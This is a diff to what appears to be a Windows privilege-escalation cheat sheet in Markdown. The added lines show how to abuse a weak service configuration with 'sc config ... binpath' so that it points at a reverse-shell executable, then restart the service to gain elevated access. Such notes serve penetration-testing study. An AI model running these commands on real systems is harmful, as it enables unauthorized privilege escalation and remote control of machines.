@@ -234,9 +234,14 @@ wmic service get name,displayname,pathname,startmode
 accesschk.exe -cv <service_name>
 accesschk64.exe /accepteula -ucqv <service_name>
 ```
-
+---
+modify the service binary path if weak config
+--> sc config service_name binpath="c:\temp\reverse.exe"
+and then restart the servicfe or wait for reboot if no permision
+--> net start service_name
+--> sc stop service_name
 👉 If you can:
-
+---
 * Change config → PrivEsc
 * Restart service → exploit
 
